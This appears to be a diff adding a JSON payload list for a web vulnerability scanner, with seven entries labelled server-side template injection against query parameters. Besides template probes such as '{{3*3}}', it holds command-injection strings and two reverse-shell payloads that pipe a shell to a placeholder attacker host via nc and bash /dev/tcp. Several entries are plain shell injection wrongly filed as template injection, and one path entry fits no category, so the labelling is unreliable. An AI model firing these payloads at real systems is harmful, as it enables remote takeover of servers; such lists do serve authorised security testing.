@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-57713",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "{{3*3}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-58951",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "`echo tbhaxor;%s;echo tbhaxor`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-60119",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": ";cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-60120",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "/modules/School",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63916",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "{{4*4}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-63917",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "{{ls}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-65170",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
